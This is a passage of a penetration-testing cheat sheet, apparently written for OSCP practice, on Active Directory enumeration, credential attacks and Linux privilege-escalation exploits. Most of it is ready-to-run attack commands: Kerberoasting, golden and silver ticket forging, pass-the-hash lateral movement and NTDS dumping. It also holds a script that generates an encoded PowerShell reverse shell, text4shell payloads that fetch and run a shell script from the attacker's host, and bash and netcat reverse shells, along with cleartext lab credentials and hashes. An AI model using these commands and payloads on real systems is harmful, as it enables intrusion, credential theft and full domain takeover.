rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querygroup <Group RID>
rpcclient $> querygroupmem <Group RID>
rpcclient $> enumdomusers
rpcclient $> queryuser <User RID> # You will get in querygroupmem <Group RID>


# enum4linux https://juggernaut-sec.com/proving-grounds-hutch/
enum4linux -u fmcsorley -p CrabSharkJellyfish192 -a 192.168.154.122 
```

- Check user in administrators group or not
```bash
net localgroup Administrators #to check local admins 
```

### Powerview

```powershell
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Get-NetComputer | select operatingsystem,dnshostname # enumerate the all computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```
### Domain

- Check weather the Windows OS joined in domain or not
  
```powershell
systeminfo | findstr /B /C:"Domain"
wmic computersystem get domain
(Get-WmiObject Win32_ComputerSystem).Domain
Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -First 1 -ExpandProperty DNSDomain)
```

### Bloodhound-python creds and hashes

- Collection methods - database
- If you don't have login with Windows AD box we can try [Gitub](https://github.com/dirkjanm/BloodHound.py)

```powershell
.\SharpHound.exe -c all,gpolocalgroup # With exe need to specify the  all,gpolocalgroup
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine

# Bloodhound-Python
#HacktheBox - Blackfield box - ippsec
python3 bloodhound -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all 
bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
bloodhound-python -u L.Livingstone --hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.177.175 -d resourced.local -c all #NTLM:NTLM, resourced pg practice
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.205.40 # hokkaido pg practice
```
#### Running Bloodhound

```powershell
sudo neo4j console
bloodhound
# then upload the .json files obtained
```
#### Bloodhound Commands 
- Bloodhound user commands 
```powershell
MATCH (m:Computer) RETURN m 
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
### LDAPDOMAINDUMP

- These files contains information in a well structured webpage format.

```bash
sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
```

### PlumHound

- Link: https://github.com/PlumHound/PlumHound install from the steps mentioned.
- Keep both Bloodhound and Neo4j running as this tool acquires information from them.

```bash
sudo python3 plumhound.py --easy -p <neo4j-password> #Testing connection
python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass> #Open index.html as once this command is completed it produces somany files
firefox index.html
```

### PingCastle

- [www.pingcastle.com](http://www.pingcastle.com) - Download Zip file from here.
- This needs to be run on windows machine, just hit enter and give the domain to scan.
- It gives a report at end of scan.

### PsLoggedon

```powershell
# To see user logons at remote system of a domain(external tool)
.\PsLoggedon.exe \\<computername>
```

### GPP or CPassword

- Impacket

```bash
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash (with an NT hash)
Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# parse a local file
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
```

- SMB share - If SYSVOL share or any share which `domain` name as folder name

```bash
#Download the whole share
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
#Navigate to the downloaded folder
grep -inr "cpassword"
```

- Crackmapexec

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
```

- Decrypting the CPassword

```bash
gpp-decrypt "cpassword"
```

## **Attacking Active Directory**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.

</aside>

### Zerologon

- [Exploit](https://github.com/VoidSec/CVE-2020-1472)
- We can dump hashes on target even without any credentials.

### Kerbrute & Password Spraying
- If the machine is windows box or Active directory is joined if crackmapexec, smbclient, smbmap and ldapsearch is not working
- Password spray after completing one domain joined machine

```powershell
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
#Caution about using -d domain and --local-auth
nxc winrm 10.10.117.154 -d oscp.exam -u users.txt -p pass.txt --continue-on-success
nxc winrm 10.10.117.154 -u users.txt -p pass.txt --continue-on-success --local-auth
#Getting shell WINRM 10.10.117.154   5985   MS02  [+] MS02\administrator:PASS <b>(Pwn3d!)</b>
evil-winrm -i 10.10.117.154 -u administrator -p PASS  

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
./kerbrute userenum -d <DOMAIN> --dc <IP> /opt/cyberstuff/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.205.40 /opt/cyberstuff/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100 # hokkaido PGPractice
```

### DeadPotato SeImpersonatePrivilege
- For SeImpersonatePrivilege try PrintSpoofer, Different Potatos
- In Powershell or cmd

```powershell
.\DeadPotato.exe -newadmin ashok:Ashok@123
net localgroup administrators # Created User
xfreerdp /u:ashok /p:Ashok@123 /v:IP /smart-sizing:1920x1080 /cert-ignore
or 
# Create a PSCredential object with the username and password
$securePassword = ConvertTo-SecureString "Ashok@123" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("domain\ashok", $securePassword)
# Use Start-Process to run a command with the specified credentials
Start-Process "cmd.exe" -Credential $credential
```
#### PrintSpoofer
- In PrintSpoofer powershell
```powershell
iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

### AS-REP Roasting
- In Windows Active Directory, You have AD list of users but don't have password we can try the Impacket-GetNPUsers (Blackfield-HackTheBox)

```powershell
#List of Users no password (Blackfield-HackTheBox)
impacket-GetNPUsers -dc-ip <IP> -no-pass -usersfile users.lst blackfield/  
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host

hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
```

### Kerberoasting

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

#Identified kerberoasting using a bloodhound, the come to the assumption of kerberoasting
#Tried with Rubeus on the MS01, but the hash cannot crack.
#Then used the **impacket-GetUserSPNs** tool with DC IP address to crack the hash using john.
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
#OSCPB 147 AD set for more information.
john -w=/home/kali/HTB/OSCP/rockyou.txt sql_svc.hash

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
```

### Silver Tickets

- Obtaining hash of an SPN user using **Mimikatz**

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```
- Forging silver ticket Ft **impacket-ticketer siver ticket**
- Reference from the Nagoya PGpractice

```powershell
# impacket-ticketer -nthash ,NTLM> -domain-sid <SID> -domain nagoya-industries.com -spn <SPN> -user-id 500 Administrator
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
```
- Forging silver ticket Ft **Mimikatz**

```powershell
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
ps> klist
```

- Accessing service

```powershell
ps> iwr -UseDefaultCredentials <servicename>://<computername>
```

### Secretsdump

```powershell
secretsdump.py <domain>/<user>:<password>@<IP>
secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
```

### Dumping NTDS.dit

```bash
secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
```

## Lateral Movement in Active Directory

### psexec - smbexec - wmiexec - atexec

- Here we can pass the credentials or even hash, depending on what we have

> *Always pass full hash to these tools!*
> 

```powershell
psexec.py <domain>/<user>:<password1>@<IP>
# the user should have write access to Admin share then only we can get sesssion

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

smbexec.py <domain>/<user>:<password1>@<IP>

smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

wmiexec.py <domain>/<user>:<password1>@<IP>

wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
#we passed full hash here
```

### winrs

```powershell
winrs -r:<computername> -u:<user> -p:<password> "command"
# run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
# run this on Windows session
```
### laps password in windows Active Diretory ms-Mcs-AdmPwd
- In active directory the user can read the administrator password using the <b>ReadLAPSPassword</b> permission [Hutch PG Practice](https://juggernaut-sec.com/proving-grounds-hutch/)
- In the bloodhound Analysis ->  'Shortest Paths to High-Value Targets' user has ReadLAPSPassword using that able to read the administrator password. [youtube](https://www.youtube.com/watch?v=yI6nN8o3YUY) complete laps procedure
- Reference [LAPS payloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/#extract-laps-password), [pyLAPS](https://github.com/p0dalirius/pyLAPS)
```powershell
# Intially identified users netexec 
netexec ldap 192.168.154.122 -u '' -p '' -M get-desc-users
# or you can find same ldapsearch
ldapsearch -x -h 192.168.154.122 -b "dc=hutch,dc=offsec" > ldap_search.txt
cat raw_users.txt | cut -d: -f2 | tr -d " " > users_ldap.txt
cat ldap_search.txt | grep -i description  # Found password in description
crackmapexec smb 192.168.154.122 -u ./users.txt -p ./passwords.txt --continue-on-success # Checking which which user password
# Bloodhound this tool available on kali linux
bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.154.122 -d hutch.offsec -c all
#powerview.ps1
. .\powerview.ps1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "fmcsorley"}
ldapsearch -H ldap://192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd # ldapsearch get laps  admin password
ldapsearch -h 192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd # Sometimes above is not work
netexec ldap 192.168.154.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.154.122 -M laps
netexec ldap 192.168.154.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps # same like above
python3 pyLAPS.py --action get -u 'fmcsorley' -d 'hutch.offsec' -p 'CrabSharkJellyfish192' --dc-ip 192.168.154.122 # LAPS, pyLAPS
# I also added a few known account names such as administrator and krbtgt
netexec smb 192.168.154.122 -u users_ldap.txt -p password.txt --continue-on-success # Admin 'BJhN#,lU/9gvqN'
# Privilege Escalation
impacket-secretsdump hutch.offsec/administrator:'BJhN#,lU/9gvqN'@192.168.154.122
impacket-wmiexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
impacket-psexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # domainadmin able to read proof.txt
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # Admin
```

### Enable RDP with PowerShell windows
- Enabling RDP with powershell [resource](https://www.helpwire.app/blog/powershell-enable-remote-desktop/)
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
xfreerdp /u:administrator /p:'BJhN#,lU/9gvqN' /v:192.168.154.122 /smart-sizing:1920x1080 /cert-ignore
```
### crackmapexec

- If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
- If evil-winrm us not working for services try the username$ doller sign at end of user

```powershell
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done

#Try --local-auth option if nothing comes up
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command

#Doller Sign Heist box from PG Practice
netexec winrm 192.168.177.165 -u svc_apache -H FC258E893FBB2444E5E7327348164F4A
evil-winrm -u svc_apache$ -H FC258E893FBB2444E5E7327348164F4A -i heist.offsec

#Pass the hash
crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
#We can run all the above commands with hash and obtain more information

#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M
# Crackmapexec nxc ssh key brute forcing
nxc ssh <IP> -u sarah -p '' --key-file idrsa_sarah

```

- Crackmapexec database

```bash
cmedb #to launch the console
help #run this command to view some others, running individual commands give infor on all the data till now we did.
```
### netexec
Similar to Crackmap it's archived <a href="https://www.netexec.wiki/getting-started/target-formats">Netexec wiki</a>
```
netexec <protocol> ~/targets.txt
netexec <protocol> <target(s)> -u username1 -p password1 password2
netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
sudo nxc smb <TARGET> -k -u USER -p PASS
```
### kpcli - keepass password manager
Found the Database.kdbx file in the smb enumeration
```
smbclient -L \\<TARGET>
smb shell> smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
keepass2john Database.kdbx > keepass.hash
#Remove Database keyword in the keepass file should start with "$keepass"
hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule (#Password - welcome)
john keepass.hash(#Password - welcome)
```
Cracking the Kdbx file with kpcli
```
>kpcli --kdb=Database.kdbx (#Password - welcome)
>ls
>cd Databases
>cd Windows
>show emma
#Password show in hide RED, select with mouse it will unhide multiple times.
>show -f emma # ClearTextPassword
```

### Pass the ticket

```powershell
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

### DCOM

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

### Golden Ticket

1. Get the krbtgt hash

```powershell
.\mimikatz.exe
privilege::debug
#below are some ways
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::dcsync /user:krbtgt

kerberos::purge #removes any exisiting tickets

#sample command
kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden

#Saved with name "golden" here, there are other options to check as well
```

1. Obtaining access!

```powershell
mimikatz.exe #no need for highest privileges
kerberos::ptt golden
misc::cmd #we're accessing cmd
```

### Shadow Copies

```powershell
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
##Windows Powershell payload encrypt </br>
<a href="https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
">Gihhub Link</a>
<a href="https://discord.com/channels/780824470113615893/1087927556604432424/1271916461442728098"> Discord Chat</a>
```powershell 
#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
```
### ReadGMSAPAssword in Active Directory
- In the bloodhound identified that user can able to read the SGMA password for svc_apache user.
- Initially tried with Hiest box for PGPractice create of the box enox github has file GMSAPasswordReader.exe is not compatible in the box.
- Tried this PowerShell script from [github](https://github.com/ricardojba/Invoke-GMSAPasswordReader/)
```powershell
. .\Invoke-GMSAPasswordReader.ps1 # You can user Import-Module as well
Invoke-GMSAPasswordReader -Command "--AccountName svc_apache"
```

### Generic All permission in Active Directory 
- In Bloodhound, I saw user has the permission to GenericALL to Domain(Computer), Create new computer -> Add a deligation -> create impersonate token(It will generate token) -> export the ticket -> Login with computer with admin access.
- Example Resourced - PG Practice [medium](https://r4j3sh.medium.com/offsec-resourced-proving-grounds-practice-writeup-78e132df93cf)
```powershell
enum4linux 192.168.177.175 # Got user creds in description
rpcclient -U="" -N 192.168.177.175
>querydispinfo # Got user creds in description
smbclient -L //192.168.177.175/ -U 'v.Ventz'
impacket-smbclient  v.Ventz:'HotelCalifornia194!'@192.168.177.175 # their is SYSTEM and ntds.dit
impacket-secretsdump -ntds ntds.dit -system SYSTEM local # Got users hashes, make it users and hashes file with LM:NTLM hashes
nxc winrm 192.168.177.175 -u users.txt -H hashes.txt
evil-winrm -i 192.168.177.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
bloodhound-python -u L.Livingstone --hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.177.175 -d resourced.local -c all #NTLM:NTLM, resourced pg 
# In that showed user has GenericAll permission to AD computer
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.177.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'r4j3sh$' -computer-pass 'Rajesh@Mondal'
python3 rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "r4j3sh$" -dc-ip 192.168.177.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
python3 getST.py -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/r4j3sh\\$:'Rajesh@Mondal' -dc-ip 192.168.177.175
export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.177.175
```
# Public Exploit

<aside>
💡 Public exploits used Windows and Linux 
    
</aside>

### Aerospike - Linux Exploit
- Aerospike port 3000 is widely used in real-time bidding, fraud detection, recommendation engines, and profile management. [Github](https://github.com/b4ny4n/CVE-2020-13151)
- Should download the <strong> poc.lua </strong> to work, match the version of aerospike, Install with (sudo pip3 install aerospike)
- Try with basic commands ls, pwd, whoami below example

```bash
python3 cve2020-13151.py --ahost 192.168.162.143 --cmd "whoami" #aero
#once above command is working start woith reverse shell
python3 cve2020-13151.py --ahost 192.168.162.143 --pythonshell --lport 3003 --lhost <Kali-Ip>
rlwrap nc -nlvp 3003 # This case used open port on the target
```
### Screen 4.5.0 - Linux Exploit
- Sticky bit permission to Screen-4.5.0
- If not able to find this  version `GLIBC_2.34' not found, Configure the Ubuntu container from this link [Github](https://github.com/X0RW3LL/XenSpawn).
- In [Exploit-DB](https://www.exploit-db.com/exploits/41154) save them to Libires(libhax.c, rootshell.c) in the above-created Ubuntu container.
- Compile the binaries(libhax.so, rootshell)  in the Ubuntu container as per [Exploit-DB](https://www.exploit-db.com/exploits/41154) scripts.

```bash
>ls -l /usr/bin/screen-4.5.0
# -rwsr-xr-x 1 root root 1860304 May 10  2021 /usr/bin/screen-4.5.0
#Transfer the compiled binaries to TARGET MACHINE /tmp folder with chmod +x permission
cd /etc
ls -l ld.so.preload # No file is their
/usr/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # My location file screen-4.5.0 might vary in your case.
ls -l ld.so.preload # Now the file is available
#Run quickly & Cross-check with the ls command, if it's deleted again run the  screen-4.5.0 command the /tmp/rootshell
/tmp/rootshell
#Drops root shell
```
### DirtyPipe - CVE-2022-0847 - Linux Exploit

- After running the linpeas.sh identified DirtyPipe in that PrivEsc list identified this exploit
- Resource from the [Github](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
- First check GCC installed on the  target machine
```bash
gcc --version
./ sh compile.sh # No luck
sh compile.sh /usr/bin/sudo
./compile.sh /usr/bin/sudo
# Downloaded exploit-2.c from above Github repository
gcc -o exploit-2 exploit-2.c
./exploit-2 /usr/bin/sudo
# Got root shell

```

### JDWP - text4shell - Linux Exploit
- OSCP B .150 Berlin machine, Find port 22 ssh, 8080  http-proxy(Apache Commons Text 1.8,**text4shell**) After running the **gobuster** identified /search, /CHANGLOG.
- Reference [Medium](https://infosecwriteups.com/text4shell-poc-cve-2022-42889-f6e9df41b3b7)
```bash
echo "bash -i >& /dev/tcp/192.168.45.220/443 0>&1" > shell
# In Browser
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27wget%20192.168.45.220%2Fshell%20-O%20%2Ftmp%2Fshell%27)%7D
http://192.168.224.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec(%27bash%20%2Ftmp%2Fshell%27)%7D
#IN KALI VM
nc -nlvp 443
```

- In privilege escalation part ran the linpeas
- Processes, Crons, Timers, Services and Sockets  tab mentioned (root java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java)
- We need to set the SUID [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1273351747758456913) or get revshell
- Optional Stable shell Generated ssh keys
```bash
ssh-keygen -t rsa -b 4096
#PATH
cat id_rsa.pub > authorized_keys
#Copy the .pub file kali vm then connect and port forward, before that check
sudo nc -p 8000 <KALIIP>
#Target shell **ll /bin/bash ** SUID bit not set
ssh -i id_rsa150 dev@192.168.197.150 -L 8000:127.0.0.1:8000
#Check Nmap port 8000 is open
#Target .150
nc 127.0.0.1 5000 -z
#Target NOW **SUID** bit not set
 **ll /bin/bash **
/bin/bash -p
id
# euid=0 (root)
#For reverse shell
python3 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc 192.168.45.161 5000 -e /bin/bash"
```
### Vesta - Linux Priv Exploit
- Links [Code](https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/), Copy last 3 code with same name as shown in the article file (vestaATO.py, VestaFuncs.py, vestaROOT.py)
- Reference OSCPC 156 Challenge lab Machine
  
```bash
#Creds are identifed using 
snmpwalk -c public -v1 192.168.221.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
python3 vestaROOT.py https://192.168.221.156:8083 Jack 3PUKsX98BMupBiCf
```
----

# Stuck?
- Take 4-7-8 breathing then machine, Walk.
- Think simple!
- Go on break! Grab a snack 🙂
- Think simple!
- Something seems broken? (web\certutil\enumeration) = REVERT!!!!!
- **Think simple!**
## Check List
- [ ] Nmap
- [ ] FTP Anonymous
- [ ] SSH
- [ ] RPC 
- [ ] SMB
- [ ] HTTP, Directory buster
- [ ] Random ports

## Initial access?

- Did you really look on the nmap output? check the service name\version\ports\HTTP titles for exploits.
- Did you try deafult credentials?
- Did you enumerate all web directories?
- Did you look on the weird ports with `nc -nv ip port`???
- Web enumeration! did you **RECURSIVLY** enumerate every directory??
- Can’t get reverse shell? try to use the same ports that are open on the machine (not only the basic 443 🙂)
- Did you check **SNMP**?

## Privilege escalation?

- Read linpeas/winpeas again - SLOWLY! (Do you see any passwords?)
- Enumerate manually
- Look for interesting files in /opt /Program Files
- Note every special file you see in the home directories.
- **GET STABLE SHELL!**
- Did you try to switch users / spray creds? (linux - get TTY to use ‘su’!!!)
- Try to run all exploits from suggested linpeas + all known exploits in linux section.
- Did you try to target other users/services? check if APACHE running and can write in it’s dir (can put there webshell)

[https://github.com/C0nd4/OSCP-Priv-Esc](https://github.com/C0nd4/OSCP-Priv-Esc)

## Active Directory?

- Did you really enumerate after you got Administrator on that machine?
- Did you spray all users with all password and all protocols? Did you try —local-auth (All Regular users\Administrator also)? + (—continue-on-success)
- Are you sure you need that priv-esc? maybe we can just pivot.
- If you have Admin == You have RDP (Just open it lol + backdoor account)

## Global

- Git
- Configuration files
- Powershell history \ transcripts
- Python script → did you try python2?
- Exploit not working? did you search another exploit version? did you search it on github? did you search the CVE?
- Found exploit but not much usage?? → DID YOU TRY READING THE COMMENTS IN THE EXPLOIT?????
- run STRINGS on binaries
  
# Resources
- [Linux Exploits GTFOBins](https://gtfobins.github.io/)
- [Windows Exploits LOLBAS](https://lolbas-project.github.io/#)
